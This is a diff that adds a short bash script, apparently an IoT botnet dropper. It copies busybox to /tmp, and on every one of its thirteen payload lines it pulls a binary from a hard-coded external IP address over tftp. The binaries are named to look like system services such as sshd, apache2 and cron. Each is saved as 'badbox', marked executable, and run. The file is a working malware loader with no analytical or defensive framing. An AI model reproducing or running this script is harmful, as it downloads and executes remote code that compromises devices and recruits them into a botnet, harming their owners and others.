@@ -1,0 +1,16 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.ntpd;cat plr.ntpd >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.sshd;cat plr.sshd >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.openssh;cat plr.openssh >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.bash;cat plr.bash >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.tftp;cat plr.tftp >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.wget;cat plr.wget >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.cron;cat plr.cron >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.ftp;cat plr.ftp >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.pftp;cat plr.pftp >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.sh;cat plr.sh >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.nut;cat plr.nut >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.apache2;cat plr.apache2 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.176.235.250 -c get plr.telnetd;cat plr.telnetd >badbox;chmod +x *;./badbox
